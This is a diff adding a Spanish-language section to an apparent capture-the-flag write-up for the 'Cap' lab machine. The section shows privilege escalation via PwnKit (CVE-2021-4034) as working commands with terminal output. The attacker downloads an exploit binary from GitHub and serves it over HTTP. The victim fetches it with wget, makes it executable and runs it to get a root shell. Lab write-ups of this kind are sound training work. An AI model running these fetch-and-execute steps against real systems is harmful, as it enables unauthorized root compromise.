@@ -135,3 +135,39 @@ root@cap:~#
 ```
 
 hemos escalado privilegios exitosamente. Podemos leer la flag de root en `/root/root.txt`
+
+
+## Extra: pwnkit (CVE-2021-4034)
+
+para ejecutar la escalada de privilegios explotando el CVE-2021-4034, tan solo debemos hacer lo siguiente:
+
+1. En nuestra máquina atacante (ej: 10.10.14.129)
+   descargamos el ejecutable del repositorio de GitHub:
+   `curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit`
+   y lo servimos a través de python
+   `python3 -m http.server 8000`
+2. En la máquina víctima
+descargamos el archivo de nuestro equipo, le damos permiso de ejecución y lo ejecutamos
+```
+nathan@cap:~$ wget http://10.10.14.129:8000/pwnkit 
+--2026-11-10 16:36:33--  http://10.10.14.129:8000/pwnkit
+Connecting to 10.10.14.129:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2564602 (2.4M) [application/octet-stream]
+Saving to: ‘pwnkit’
+
+pwnkit                     100%[=====================================>]   2.45M   208KB/s    in 14s     
+
+2026-11-10 16:36:48 (177 KB/s) - ‘pwnkit’ saved [2564602/2564602]
+
+nathan@cap:~$ chmod +x pwnkit 
+nathan@cap:~$ ./pwnkit 
+Pwning....
+[+] Beginning exploit...
+# whoami
+root
+```
+
+
+
+
